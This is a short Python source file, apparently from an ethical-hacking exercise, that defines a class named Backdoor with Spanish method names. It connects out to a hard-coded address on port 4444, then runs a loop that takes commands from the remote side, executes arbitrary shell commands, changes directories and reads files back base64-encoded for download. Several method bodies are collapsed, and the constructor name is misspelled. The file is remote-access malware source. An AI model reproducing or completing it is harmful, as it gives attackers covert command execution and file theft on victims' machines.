import socket
import subprocess
import json
import os
import base64


class Backdoor:
    def ___init___(self, ip, port):···

    def reliable_send(self, data):···
    
    def reliable_receive(self):···
      
    def ejecutar_comando(self, command):···    
           
    def cambiar_directorio(self,path):···

    def leer_archivo(self, path):
        with open(path, "rb") as file:   
             return base64.b64encode(file.read())   
    
    def run(self):
        while True:
            command = self.reliable_receive()
            if command[0] == "salir":
                self.connection.close()
                exit()
            elif command[0] == "cd" and len(command) > 1:
                resultados_comando = self.cambiar_directorio(command[1])           
            elif command[0] == "descargar":
                resultados_comando = self.leer_archivo(command[1])
            else:  
                resultados_comando = self.ejecutar_comando(command)
            
            self.reliable_send(resultados_comando)


puerta = Backdoor("192.168.1.110", 4444)
puerta.run()